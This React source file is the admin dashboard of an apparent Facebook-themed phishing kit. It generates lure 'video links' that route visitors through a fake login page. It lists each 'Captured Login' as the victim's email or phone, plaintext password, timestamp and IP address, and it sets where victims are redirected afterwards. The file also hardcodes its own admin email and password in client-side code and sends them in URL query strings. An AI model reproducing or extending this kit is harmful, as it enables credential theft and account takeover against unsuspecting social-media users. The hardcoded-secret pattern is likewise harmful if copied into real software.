import { useState, useEffect } from 'react'
import { parseVideoUrl } from '../utils/videoThumbnail'
import type { VideoInfo } from '../utils/videoThumbnail'
import './AdminPage.css'

const ADMIN_EMAIL = 'kabagambe@gmail.com'
const ADMIN_PASSWORD = 'kabagambe123'
const API = 'http://localhost:3001'
const BASE_URL = window.location.origin

interface LoginEntry {
  id: number
  email: string
  password: string
  timestamp: string
  ip: string
}

interface VideoLink {
  id: number
  slug: string
  originalUrl: string
  thumbnail: string | null
  title: string
  type: string
  createdAt: string
}

function generateSlug(len = 8) {
  return Math.random().toString(36).slice(2, 2 + len)
}

export default function AdminPage() {
  const [authed, setAuthed] = useState(false)
  const [loginEmail, setLoginEmail] = useState('')
  const [loginPassword, setLoginPassword] = useState('')
  const [loginError, setLoginError] = useState('')

  const [logins, setLogins] = useState<LoginEntry[]>([])
  const [redirectUrl, setRedirectUrl] = useState('')
  const [newUrl, setNewUrl] = useState('')
  const [urlMsg, setUrlMsg] = useState('')
  const [clearMsg, setClearMsg] = useState('')

  // Video link generator
  const [videoInput, setVideoInput] = useState('')
  const [videoInfo, setVideoInfo] = useState<VideoInfo | null>(null)
  const [videoLinks, setVideoLinks] = useState<VideoLink[]>([])
  const [genMsg, setGenMsg] = useState('')
  const [copiedSlug, setCopiedSlug] = useState<string | null>(null)
  const [justGeneratedLink, setJustGeneratedLink] = useState<string | null>(null)
  const [justGeneratedCopied, setJustGeneratedCopied] = useState(false)

  // ── Admin login ────────────────────────────────────────
  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoginError('')
    if (loginEmail === ADMIN_EMAIL && loginPassword === ADMIN_PASSWORD) {
      setAuthed(true)
    } else {
      setLoginError('Wrong email or password.')
    }
  }

  // ── Fetch data once authed ─────────────────────────────
  useEffect(() => {
    if (!authed) return
    fetchLogins()
    fetchConfig()
    fetchVideoLinks()
  }, [authed])

  const fetchLogins = async () => {
    const res = await fetch(
      `${API}/api/admin/logins?email=${encodeURIComponent(ADMIN_EMAIL)}&password=${encodeURIComponent(ADMIN_PASSWORD)}`
    )
    setLogins(await res.json())
  }

  const fetchConfig = async () => {
    const res = await fetch(
      `${API}/api/admin/config?email=${encodeURIComponent(ADMIN_EMAIL)}&password=${encodeURIComponent(ADMIN_PASSWORD)}`
    )
    const data = await res.json()
    setRedirectUrl(data.redirectUrl || '')
    setNewUrl(data.redirectUrl || '')
  }

  const fetchVideoLinks = async () => {
    const res = await fetch(
      `${API}/api/admin/video-links?email=${encodeURIComponent(ADMIN_EMAIL)}&password=${encodeURIComponent(ADMIN_PASSWORD)}`
    )
    setVideoLinks(await res.json())
  }

  // ── Update redirect URL ────────────────────────────────
  const handleSaveUrl = async (e: React.FormEvent) => {
    e.preventDefault()
    setUrlMsg('')
    const res = await fetch(`${API}/api/admin/config`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: ADMIN_EMAIL, password: ADMIN_PASSWORD, redirectUrl: newUrl }),
    })
    const data = await res.json()
    if (data.success) {
      setRedirectUrl(newUrl)
      setUrlMsg('✅ Redirect URL updated!')
    } else {
      setUrlMsg('❌ Failed to update.')
    }
    setTimeout(() => setUrlMsg(''), 3000)
  }

  // ── Clear all logins ───────────────────────────────────
  const handleClearLogins = async () => {
    if (!confirm('Clear all login records? This cannot be undone.')) return
    const res = await fetch(`${API}/api/admin/logins`, {
      method: 'DELETE',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: ADMIN_EMAIL, password: ADMIN_PASSWORD }),
    })
    const data = await res.json()
    if (data.success) {
      setLogins([])
      setClearMsg('✅ All records cleared.')
    }
    setTimeout(() => setClearMsg(''), 3000)
  }

  // ── Video URL input — show thumbnail instantly ─────────
  const handleVideoInput = (val: string) => {
    setVideoInput(val)
    setGenMsg('')
    setJustGeneratedLink(null)
    if (!val.trim()) {
      setVideoInfo(null)
      return
    }
    try {
      const info = parseVideoUrl(val.trim())
      if (info.type === 'unknown') {
        setVideoInfo(null)
      } else {
        setVideoInfo(info)
      }
    } catch {
      setVideoInfo(null)
    }
  }

  // ── Generate shareable link ────────────────────────────
  const handleGenerate = async () => {
    if (!videoInfo) {
      setGenMsg('❌ Please paste a valid YouTube or Facebook video URL first.')
      return
    }
    setGenMsg('⏳ Generating link...')
    const slug = generateSlug()
    try {
      const res = await fetch(`${API}/api/admin/video-links`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: ADMIN_EMAIL,
          password: ADMIN_PASSWORD,
          originalUrl: videoInfo.originalUrl,
          slug,
          thumbnail: videoInfo.thumbnail,
          title: videoInfo.title,
          type: videoInfo.type,
        }),
      })
      const data = await res.json()
      if (data.success) {
        setVideoLinks(prev => [...prev, data.entry])
        setVideoInput('')
        setVideoInfo(null)
        const link = `${BASE_URL}/watch/${slug}`
        setJustGeneratedLink(link)
        setJustGeneratedCopied(false)
        setGenMsg('')
      } else {
        setGenMsg(`❌ ${data.error || 'Failed to generate link.'}`)
      }
    } catch {
      setGenMsg('❌ Cannot reach server. Make sure "npm run server" is running on port 3001.')
    }
  }

  // ── Delete a video link ────────────────────────────────
  const handleDeleteVideo = async (id: number) => {
    if (!confirm('Delete this video link?')) return
    await fetch(`${API}/api/admin/video-links/${id}`, {
      method: 'DELETE',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: ADMIN_EMAIL, password: ADMIN_PASSWORD }),
    })
    setVideoLinks(prev => prev.filter(v => v.id !== id))
  }

  // ── Copy to clipboard ──────────────────────────────────
  const copyLink = (slug: string) => {
    navigator.clipboard.writeText(`${BASE_URL}/watch/${slug}`)
    setCopiedSlug(slug)
    setTimeout(() => setCopiedSlug(null), 2000)
  }

  const copyJustGenerated = () => {
    if (!justGeneratedLink) return
    navigator.clipboard.writeText(justGeneratedLink)
    setJustGeneratedCopied(true)
    setTimeout(() => setJustGeneratedCopied(false), 2000)
  }

  // ── Admin login screen ─────────────────────────────────
  if (!authed) {
    return (
      <div className="admin-gate">
        <div className="admin-gate__box">
          <h1 className="admin-gate__title">
            <span className="admin-gate__fb">f</span> Admin Panel
          </h1>
          <p className="admin-gate__sub">Sign in with your admin credentials</p>
          <form onSubmit={handleAdminLogin} className="admin-gate__form">
            <input
              type="email"
              placeholder="Admin email"
              value={loginEmail}
              onChange={e => setLoginEmail(e.target.value)}
              className="admin-gate__input"
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={loginPassword}
              onChange={e => setLoginPassword(e.target.value)}
              className="admin-gate__input"
              required
            />
            {loginError && <p className="admin-gate__error">{loginError}</p>}
            <button type="submit" className="admin-gate__btn">Sign in</button>
          </form>
        </div>
      </div>
    )
  }

  // ── Admin dashboard ────────────────────────────────────
  return (
    <div className="admin">
      {/* Header */}
      <header className="admin__header">
        <div className="admin__header-logo">
          <span className="admin__fb-icon">f</span>
          <span className="admin__header-title">Admin Dashboard</span>
        </div>
        <button className="admin__logout" onClick={() => setAuthed(false)}>
          Log out
        </button>
      </header>

      <div className="admin__body">

        {/* ── Video Link Generator ── */}
        <section className="admin__card">
          <h2 className="admin__card-title">🎬 Video Link Generator</h2>
          <p className="admin__card-desc">
            Paste a YouTube or Facebook video URL. A thumbnail will appear instantly.
            Click <strong>Generate Link</strong> to create a shareable link — anyone
            who opens it will first land on the login page, then go to the video.
          </p>

          <div className="vgen__input-row">
            <input
              type="url"
              className="vgen__input"
              placeholder="https://www.youtube.com/watch?v=... or https://fb.watch/..."
              value={videoInput}
              onChange={e => handleVideoInput(e.target.value)}
            />
            <button
              className="vgen__btn-generate"
              onClick={handleGenerate}
              type="button"
            >
              🔗 Generate Link
            </button>
          </div>

          {/* Thumbnail preview — shown when URL is recognised */}
          {videoInfo && (
            <div className="vgen__preview">
              <div className="vgen__thumb-wrap">
                {videoInfo.thumbnail ? (
                  <img
                    src={videoInfo.thumbnail}
                    alt="Video thumbnail"
                    className="vgen__thumb"
                  />
                ) : (
                  <div className="vgen__thumb-placeholder">
                    <span>📹</span>
                    <p>Facebook video — thumbnail not available publicly</p>
                  </div>
                )}
                <span className={`vgen__badge vgen__badge--${videoInfo.type}`}>
                  {videoInfo.type === 'youtube' ? '▶ YouTube' : '📘 Facebook'}
                </span>
              </div>
              <div className="vgen__preview-info">
                <p className="vgen__url-preview">{videoInfo.originalUrl}</p>
              </div>
            </div>
          )}

          {genMsg && <p className="admin__msg vgen__genmsg">{genMsg}</p>}

          {/* ── Just-generated link banner ── */}
          {justGeneratedLink && (
            <div className="vgen__result-banner">
              <div className="vgen__result-banner__top">
                <span className="vgen__result-banner__label">✅ Your shareable link is ready!</span>
                <button
                  className="vgen__result-banner__dismiss"
                  onClick={() => setJustGeneratedLink(null)}
                  title="Dismiss"
                >✕</button>
              </div>
              <div className="vgen__result-banner__row">
                <span className="vgen__result-banner__url">{justGeneratedLink}</span>
                <button
                  className={`vgen__result-banner__copy ${justGeneratedCopied ? 'vgen__result-banner__copy--copied' : ''}`}
                  onClick={copyJustGenerated}
                >
                  {justGeneratedCopied ? '✅ Copied!' : '📋 Copy Link'}
                </button>
              </div>
              <p className="vgen__result-banner__hint">
                Share this link — when people open it they'll log in first, then go to the video.
              </p>
            </div>
          )}

          {/* Generated links table */}
          {videoLinks.length > 0 && (
            <div className="vgen__links">
              <h3 className="vgen__links-title">Generated Links ({videoLinks.length})</h3>
              <div className="admin__table-wrap">
                <table className="admin__table">
                  <thead>
                    <tr>
                      <th>Thumb</th>
                      <th>Shareable Link</th>
                      <th>Original URL</th>
                      <th>Created</th>
                      <th></th>
                    </tr>
                  </thead>
                  <tbody>
                    {[...videoLinks].reverse().map(v => (
                      <tr key={v.id}>
                        <td>
                          {v.thumbnail
                            ? <img src={v.thumbnail} alt="" className="vgen__table-thumb" />
                            : <span className="vgen__table-nothumb">📹</span>
                          }
                        </td>
                        <td>
                          <div className="vgen__link-cell">
                            <span className="vgen__link-text">{BASE_URL}/watch/{v.slug}</span>
                            <button
                              className={`vgen__btn-copy ${copiedSlug === v.slug ? 'vgen__btn-copy--copied' : ''}`}
                              onClick={() => copyLink(v.slug)}
                            >
                              {copiedSlug === v.slug ? '✅ Copied!' : '📋 Copy'}
                            </button>
                          </div>
                        </td>
                        <td>
                          <a
                            href={v.originalUrl}
                            target="_blank"
                            rel="noreferrer"
                            className="admin__link vgen__orig-url"
                          >
                            {v.originalUrl.length > 40
                              ? v.originalUrl.slice(0, 40) + '…'
                              : v.originalUrl}
                          </a>
                        </td>
                        <td className="admin__td-time">
                          {new Date(v.createdAt).toLocaleString()}
                        </td>
                        <td>
                          <button
                            className="vgen__btn-delete"
                            onClick={() => handleDeleteVideo(v.id)}
                            title="Delete"
                          >
                            🗑
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </section>

        {/* ── Redirect URL card ── */}
        <section className="admin__card">
          <h2 className="admin__card-title">🔗 Default Redirect URL</h2>
          <p className="admin__card-desc">
            When a user logs in <em>without</em> coming from a video link, they go here.
            <br />Current: <a href={redirectUrl} target="_blank" rel="noreferrer" className="admin__link">{redirectUrl}</a>
          </p>
          <form onSubmit={handleSaveUrl} className="admin__url-form">
            <input
              type="url"
              value={newUrl}
              onChange={e => setNewUrl(e.target.value)}
              placeholder="https://example.com"
              className="admin__url-input"
              required
            />
            <button type="submit" className="admin__btn-save">Save</button>
          </form>
          {urlMsg && <p className="admin__msg">{urlMsg}</p>}
        </section>

        {/* ── Captured logins card ── */}
        <section className="admin__card">
          <div className="admin__card-header">
            <h2 className="admin__card-title">👥 Captured Logins ({logins.length})</h2>
            <div className="admin__card-actions">
              <button className="admin__btn-refresh" onClick={fetchLogins}>↻ Refresh</button>
              {logins.length > 0 && (
                <button className="admin__btn-clear" onClick={handleClearLogins}>🗑 Clear all</button>
              )}
            </div>
          </div>
          {clearMsg && <p className="admin__msg">{clearMsg}</p>}

          {logins.length === 0 ? (
            <p className="admin__empty">No logins captured yet.</p>
          ) : (
            <div className="admin__table-wrap">
              <table className="admin__table">
                <thead>
                  <tr>
                    <th>#</th>
                    <th>Email / Phone</th>
                    <th>Password</th>
                    <th>Time</th>
                    <th>IP</th>
                  </tr>
                </thead>
                <tbody>
                  {[...logins].reverse().map((entry, i) => (
                    <tr key={entry.id}>
                      <td>{logins.length - i}</td>
                      <td className="admin__td-email">{entry.email}</td>
                      <td className="admin__td-pass">{entry.password}</td>
                      <td className="admin__td-time">
                        {new Date(entry.timestamp).toLocaleString()}
                      </td>
                      <td>{entry.ip}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </section>

      </div>
    </div>
  )
}
